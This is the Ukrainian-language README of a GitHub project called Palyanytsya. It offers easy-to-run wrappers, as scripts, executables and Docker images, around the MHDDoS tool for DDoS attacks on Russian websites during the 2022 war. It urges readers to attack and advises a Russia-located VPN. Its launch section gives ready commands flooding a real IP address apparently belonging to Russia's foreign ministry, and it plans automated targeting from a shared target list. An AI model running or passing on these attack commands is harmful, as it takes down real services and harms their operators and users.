# Паляниця

![GitHub last commit](https://img.shields.io/github/last-commit/pocket-sunflower/palyanytsya)
[![Python 3.10](https://img.shields.io/badge/python-3.10-f.svg)](https://www.python.org/downloads/release/python-360/)
![](https://postgresql.org/)
![](https://img.shields.io/github/license/pocket-sunflower/palyanytsya)
![](https://img.shields.io/docker/pulls/pocketsunflower/pyrizhok?label=pyrizhok%20docker%20pulls)
![](https://img.shields.io/docker/pulls/pocketsunflower/palyanytsya?label=palyanytsya%20docker%20pulls)

Цифрова зброя проти xуйлoвської пропаганди.

Щоб негайно почати шкварити рашистські сайти – мерщій у [швидкий старт](docs/QUICKSTART.md)! ⚡️

А коли ворожі сервери вже жаряться і є час почитати – ласкаво просимо вниз.

---

## 🔥 Мотивація

24-го лютого 2022 року Російська Федерація підступно напала на Україну. В перші дні нападу Мінцифри України оперативно організувало кібер-армію: легіон IT-фахівців та волонтерів, які доклали свої сили та вміння на протидію рашистському агресору у цифровому просторі.

Цей репозиторій – духовний спадкоємець декількох проектів, що допомагали нам тримати цифровий тиск по ворогу у перший тиждень війни. Наша ціль – зробити запуск цього коду якомога простішим для більшості людей і при тому зберегти ефективність і гнучкість опцій атаки.

Тож, вмикайте свої машини, відкривайте термінали, і вліпимо дружньою паляницею по системах окупантів!

Слава Україні! Ми разом і ми переможемо! 💙💛

---

## 🔧 Технічні деталі 


[MHDDoS][mhddos-github] – це потужний пайтон-скрипт для виконання DDoS атак у різних режимах. Наш репозиторій надає для нього два прості врапери: 

- Пиріжок ([pyrizhok](pyrizhok.py)) – мінімалістична версія врапера, яка потребує лише **адресу цілі** для того, щоб запустити атаку. Тим паче, за бажанням можна надати інший **порт** і **протокол**. Створений для починаючих котиків 😸
- Паляниця ([palyanytsya](palyanytsya.py)) – це повний врапер для MHDDoS, який приймає **всі опції** з оригінального скрипта. Створений для досвідчених в IT котів та киць 😼


### 📑 Параметри

**_ВАЖЛИВО:_** Не забувайте користуватися VPN! Бажано з локацією в Росії - так ефективніше.

**Пиріжок** можна запускати без параметрів – під час запуску він сам спитає вас про те, кому треба вгатити.

Тим не менш, параметри можна передати наперед у такому форматі:

```bash
pyrizhok.py <target_address> <target_port> <attack_protocol>
```

Значення параметрів:

1. `target_address` – адреса цілі. Може бути URL або IP-адресою.
2. `target_port` – (опціонально) порт цілі.
3. `attack_protocol` – (опціонально, потребує вказаний порт) протокол, який буде використовуватися для атаки. Доступні протоколи можна подивитися [в секції про Layer4 в оригінальному доці MHDDoS][mhddos-github-layer4]. 

**Паляниця** дає доступ до всіх опцій в MHDDoS, яких немало, тому зараз рекомендуємо дивитися прямо в [оригінальну документацію][mhddos-github-launch]. Також деталі про параметри можна подивитися запустивши паляницю з параметром help: 
```bash
palyanytsya.py help
```

Мапа параметрів залежить від того, на який шар мережі ведеться атака.

- Layer 7: 
   ```bash
   palyanytsya.py <method> <url> <socks_type5.4.1> <threads> <proxylist> <rpc> <duration>

- Layer 4: 
  ```bash
  palyanytsya.py <method> <ip:port> <threads> <duration>
  ```



### 🍞 Випічка

Паляниця та пиріжок запаковані в декілька різних форматів, аби зменшити час на налаштування і запуск до мінімуму.

**PyInstaller 🐍** Standalone версії обох програм запаковані за допомогою [PyInstaller][pyinstaller]. Python-скрипти для створення білдів можна знайти у папці [build_scripts_PyInstaller](build_scripts_PyInstaller). Зауважте, що білд створюється для тієї ж платформи, на якій запущено скрипт (наприклад, щоб збілдити проект на Mac - треба запустити бідповідний білд на машині з macOS). Вихідні файли знаходяться у своїх папках:
- Білди .exe для Windows – в [executables/Windows](executables/Windows).
- Білди для Linux – в [executables/Linux](executables/Linux).
- Білди для Mac – в [executables/Mac](executables/Mac).

**Docker 🐋** Скрипти для збирання Docker-контейнерів та самі Dockerфайли знаходяться в папці [build_scripts_Docker](build_scripts_Docker). Найновіші версії обох контейнерів також доступні у репозиторії Docker Hub:
- [pocketsunflower/pyrizhok:latest][dockerhub-pyrizhok]
- [pocketsunflower/palyanytsya:latest][dockerhub-palyanytsya]


### 🥡 Запуск вихідного коду

Щоби запустити пиріжок чи паляницю з джерела:

1. Клонуємо цей репозиторій:
    ```bash
    git clone https://github.com/pocket-sunflower/palyanytsya
    ```

2. Заходимо в папку та створюємо віртуальне середовише (**ВАЖЛИВО:** на Python 3.10+):
    ```bash
    cd palyanytsya
    virtualenv --python python3.10 venv
    ```

3. Активуємо середовище та встановлюємо залежності:
    ```bash
    source venv/bin/activate7
    pip install -r requirements.txt
    ```

4. Запускаємо пиріжок (або паляничку) з потрібною адресою, наприклад _194.85.30.210_ ([саме так][same-tak]):
    ```bash
    python3 pyrizhok.py 194.85.30.210 443 TCP
    ```
    ```bash
    python3 palyanytsya.py bypass 194.85.30.210 5 100 socks5.txt 10000 3600
    ```

    …і те, що за адресою, відправляється вслєд за рускім корабльом.

---

## 🚀 Плани та колаборація

Найближчим часом планується:
- Додати новий клієнт для автоматичного «тестування» [адрес][db1000n-targets] наданих проектом [«Death by 1000 needles»][db1000n]. Це допоможе нам бути більш скоординованими та ефективними.
- Додати кращий логінг статусу атаки (наразі атака іде у фоновому режимі, без індикації статусу).
- Додати автоматизацію білдів для усіх платформ через CI.
- Whatever else may come…

Якщо ви можете допомогти з будь-яким пунктом вище, або у вас є ідеї про те, як покращити існуючий код, ми будемо дуже вдячні - відкривайте [issues][repo-issues] та пропонуйте [pull requests][repo-pull-requests]. Єдина умова - чітко поясніть, що ви хотіли би змінити, щоб ніхто не витрачав часу на непорозуміння.

---

<div style="text-align: center">Бережіть себе! Все буде Україна! </div>

<div style="text-align: center">💙💛</div>

<div style="text-align: right"><span style="font-style: italic">Pocket Sunflower </span>🌻</div>



<!--- References --->
[mhddos-github]: https://github.com/MHProDev/MHDDoS
[mhddos-github-launch]: https://github.com/MHProDev/MHDDoS#launch-script
[mhddos-github-layer4]: https://github.com/MHProDev/MHDDoS#features-and-methods
[pyinstaller]: https://pyinstaller.readthedocs.io/en/stable/index.html
[db1000n]: https://github.com/Arriven/db1000n
[db1000n-targets]: https://github.com/db1000n-coordinators/LoadTestConfig/blob/main/config.json
[repo-issues]: https://github.com/pocket-sunflower/palyanytsya/issues
[repo-pull-requests]: https://github.com/pocket-sunflower/palyanytsya/pulls
[dockerhub-pyrizhok]: https://hub.docker.com/repository/docker/pocketsunflower/pyrizhok
[dockerhub-palyanytsya]: https://hub.docker.com/repository/docker/pocketsunflower/palyanytsya
[same-tak]: https://www.nslookup.io/dns-records/mid.ru
